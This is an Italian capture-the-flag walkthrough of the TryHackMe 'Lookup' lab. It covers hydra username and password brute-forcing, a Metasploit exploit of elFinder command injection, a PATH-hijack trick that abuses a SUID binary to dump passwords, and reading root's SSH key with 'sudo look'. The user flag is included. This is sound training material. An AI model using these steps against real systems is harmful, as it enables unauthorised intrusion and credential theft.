#tryhackmelabs #laboratorio 

https://tryhackme.com/room/lookup


**Lookup** offre una miniera di opportunità di apprendimento per aspiranti hacker. Questa macchina intrigante mostra diverse vulnerabilità del mondo reale, che vanno dalle debolezze delle applicazioni web alle tecniche di escalation dei privilegi. Esplorando e sfruttando queste vulnerabilità, gli hacker possono affinare le proprie competenze e acquisire una preziosa esperienza nell'hacking etico. Attraverso "Lookup", gli hacker possono padroneggiare l'arte della ricognizione, della scansione e dell'enumerazione per scoprire servizi e sottodomini nascosti. Impareranno a sfruttare le vulnerabilità delle applicazioni web, come l' iniezione di comandi , e a comprendere l'importanza delle pratiche di codifica sicura. La macchina sfida inoltre gli hacker ad automatizzare le attività, dimostrando la potenza dello scripting nei test di penetrazione.

```
nmap -Pn -O -v -p- 10.10.81.195
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

```
nmap -sVC -v -p22,80 10.10.81.195
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0e:70:34:9e:be:3f:2d:48:ac:4d:1a:1f:63:6c:3e:e1 (RSA)
|   256 0f:af:42:08:e3:8b:c4:65:4a:1e:03:78:13:a3:3f:b6 (ECDSA)
|_  256 f8:bd:11:2c:82:44:52:95:a7:0c:57:99:c8:ad:5f:8c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
andiamo su
```
http://10.10.81.195
```
non visualizziamo la pagina
```
http://lookup.thm/
```
aggiungiamo il dominio a hosts
```
echo "10.10.81.195    lookup.thm" >> /etc/hosts
```
riandiamo su 
```
http://lookup.thm/
```
ed otteniamo pagina di login

se immettiamo delle credenziali casuali otteniamo info su la validità dell'user e della password
e dopo un tempo di attesa veniamo reindirizzati al login

intanto con Wappalyzer possiamo vedere  che il linguaggio di programmazione è PHP su WebServer Apache, SO Ubuntu

poi  leggendo la descrizione della macchina  proviamo ad eseguire una enumerazione dei sottodomini
```
ffuf -u http://FUZZ.lookup.thm -w /usr/share/wordlists/dirb/common.txt
```


ora enumeriamo gli utenti validi con hydra
(dopo aver reperito qualche info su BurpSuite)

```
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -p password lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username" -I
```
e troviamo
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-16 10:57:18
[DATA] max 16 tasks per 1 server, overall 16 tasks, 624370 login tries (l:624370/p:1), ~39024 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong username
[80][http-post-form] host: lookup.thm   login: admin   password: password
[80][http-post-form] host: lookup.thm   login: jose   password: password

```
ora proviamo un Brute Force su la password di jose
```
hydra -l jose -P /usr/share/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" -I
```
e troviamo
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 999998 login tries (l:1/p:999998), ~62500 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong password
[80][http-post-form] host: lookup.thm   login: jose   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-16 10:59:36
                                                                                       
```

ci logghiamo su `http://lookup.thm/` con le credenziali jose:password123
veniamo reindirizzati su
```
http://files.lookup.thm/
```
aggiungiamo il dominio al file hosts
```
echo "10.10.81.195    files.lookup.thm" >> /etc/hosts
```
ed ora una volta loggati veniamo reindirizzati a
```
http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw
```

cliccando sul punto interrogativo dell'applicazione web otteniamo informazioni su questa come
```
elFinder gestore file Web versione 2.1.47 jQuery
```
facciamo una ricerca web e scopriamo che è vulnerabile come ci conferma anche searchsploit
```
searchsploit elFinder
```
```
elFinder 2 - Remote Command Execution (via File Creation)                                                                                         | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command Injection                                                                                               | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                       | php/remote/46539.rb
elFinder Web file manager Version - 2.1.53 Remote Command Execution                                                                               | php/webapps/51864.txt

```
proviamo a vedere se c'è qualcosa di veloce e facile da utilizzare su metasploit
```
search elFinder
```
```
   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection

```

```
use 4
```

```
show options
```

```
set RHOSTS files.lookup.thm
```

```
set LHOST 10.14.99.134
```

```
set TARGETURI /elFinder/
```
otteniamo la shell meterpreter
```
meterpreter > getuid
Server username: www-data
```

```
shell
```

navighiamo tra le directory

```
cd /home
ls -al
total 20
drwxr-xr-x  5 root     root     4096 Jul 16 13:59 .
drwxr-xr-x 19 root     root     4096 Jul 16 13:59 ..
drwxr-xr-x  2 ssm-user ssm-user 4096 May 28 19:20 ssm-user
drwxr-xr-x  5 think    think    4096 Jan 11  2024 think
drwxr-xr-x  3 ubuntu   ubuntu   4096 Jul 16 13:59 ubuntu
cd think
ls -al
total 40
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 5 root  root  4096 Jul 16 13:59 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
cat user.txt
cat: user.txt: Permission denied
```

non abbiamo i permessi per leggere ne user.txt e neanche .passwords

cerchiamo file con permessi suid per scalare i privilegi
```
find / -perm -4000 2>/dev/null
```

```
find / -perm -4000 2>/dev/null

/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount

```

```
/usr/sbin/pwm
```
se eseguiamo il comando ci dice
```
pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found

```

esegui il comando`id`per impersonare l'utente e leggere il file`.passwords`

Possiamo eseguire un _Path Hijack_ , creando il nostro comando`id` e aggiungendolo alla variabile `PATH`. In questo modo, quando `pwm` viene eseguito, eseguirà il nostro `id`comando invece di quello reale.


```
cat > /tmp/id << EOF
```

Il comando `cat > /tmp/id << EOF` è un'istruzione utilizzata in un terminale Unix/Linux per creare un file e scriverci del contenuto. Ecco una spiegazione dettagliata di cosa fa:

1. **`cat`**: Questo comando è utilizzato per concatenare e visualizzare il contenuto dei file. In questo caso, viene utilizzato per scrivere nel file.
    
2. **`>`**: Questo simbolo reindirizza l'output del comando `cat` verso un file. Se il file specificato non esiste, verrà creato; se esiste già, il suo contenuto verrà sovrascritto.
    
3. **`/tmp/id`**: Questo è il percorso del file in cui verrà scritto il contenuto. In questo caso, il file si chiamerà `id` e sarà situato nella directory temporanea `/tmp`.
    
4. **`<< EOF`**: Questo è un costrutto di "here document" (documento qui) che permette di fornire input multilinea al comando. `EOF` è un delimitatore che indica l'inizio e la fine del contenuto che si desidera scrivere nel file. Puoi sostituire `EOF` con qualsiasi altra parola, ma è comune utilizzare `EOF` per convenzione.
    

Dopo aver eseguito questo comando, puoi digitare il contenuto che desideri scrivere nel file `id`. Una volta terminato, premi `Enter` e poi digita `EOF` (o il delimitatore che hai scelto) su una nuova riga per terminare l'input. Il contenuto che hai digitato verrà quindi salvato nel file `/tmp/id`.

Ecco un esempio di utilizzo:

```bash

`cat > /tmp/id << EOF Questo è un esempio di contenuto. Puoi scrivere più righe qui. EOF`

Dopo aver eseguito questo, il file `/tmp/id` conterrà il testo specificato.
```



Creiamo il comando `id` in /tmp/id
```
cat > /tmp/id << EOF
```
```
#!/bin/bash
```
```
echo '$(id think)'
```
```
EOF
```

per curiosità vediamo il contenuto del file creato 
```
ls /tmp
id
cat /tmp/id
#!/bin/bash
echo 'uid=1000(think) gid=1000(think) groups=1000(think)'
```

diamo i permessi di esecuzione
```
chmod +x /tmp/id
```

Aggiungiamo /tmp/ alla variabile `PATH`
```
export PATH=/tmp:$PATH
```

Eseguiamo `pwm` per ottenere le password del file `/home/think/.passwords` 
```
/usr/sbin/pwm
```

```
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

creiamo un file contenente le password 
```
nano pass.txt
```

ed utilizziamo hydra per provare a sfruttarle in ssh 

```
hydra -l think -P pass.txt 10.10.81.195 ssh
```
abbiamo trovato la password di think
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-16 12:54:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://10.10.81.195:22/
[22][ssh] host: 10.10.81.195   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-16 12:54:09

```

```
[22][ssh] host: 10.10.81.195   login: think   password: josemario.AKA(think)
```
connettiamoci in ssh

```
ssh think@10.10.81.195
```

```
think@ip-10-10-81-195:~$ ls -al
total 40
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 5 root  root  4096 Jul 16 13:59 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null

```

```
cat user.txt
```
```
think@ip-10-10-81-195:~$ cat user.txt
38375fb4dd8baa2b2039ac03d92b820e
```
Qual'è il flag utente?
```
38375fb4dd8baa2b2039ac03d92b820e
```

ora proviamo ad elevare i privilegi

```
sudo -l
```

```
Matching Defaults entries for think on ip-10-10-81-195:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-10-81-195:
    (ALL) /usr/bin/look

```

cerchiamo info su
https://gtfobins.github.io/gtfobins/look/#sudo

Se al binario viene consentito di essere eseguito come superutente `sudo`, i privilegi elevati non vengono eliminati e può essere utilizzato per accedere al file system, aumentare o mantenere l'accesso privilegiato.
```
LFILE=file_to_read
sudo look '' "$LFILE"
```

quindi possiamo provare a leggere il file della chiave privata di root ed in seguito loggarci come root in ssh

```
LFILE=/root/.ssh/id_rsa
```

```
sudo look '' "$LFILE"
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
xxxxxxxxxxxxxx
-----END OPENSSH PRIVATE KEY-----
```

```
nano id_rsa
```
ci copiamo la chiave ed impostiamo i permessi
```
chmod 600 id_rsa
```

```
ssh -i id_rsa root@lookup.thm
```

```
whoami
```
siamo root!
```
root@ip-10-10-81-195:~# ls
total 52K
drwx------  6 root root 4.0K May 28 19:24 .
drwxr-xr-x 19 root root 4.0K Jul 16 13:59 ..
lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.2K May 12  2024 .bashrc
drwx------  2 root root 4.0K Jan 11  2024 .cache
-rwxrwx---  1 root root   66 Jan 11  2024 cleanup.sh
drwx------  3 root root 4.0K Apr 17  2024 .config
drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
-rw-r--r--  1 root root  161 Jan 11  2024 .profile
-rw-r-----  1 root root   33 Jan 11  2024 root.txt
lrwxrwxrwx  1 root root    9 Jul 31  2023 .selected_editor -> /dev/null
drwx------  2 root root 4.0K May 28 19:24 .ssh
-rw-rw-rw-  1 root root  11K May 28 19:24 .viminfo
root@ip-10-10-81-195:~# cat root.txt
xxxxxxxxxxxxxxx
root@ip-10-10-81-195:~# 
```
Qual'è la flag di root
```
xxxxxxxxxxxxxxxx
```
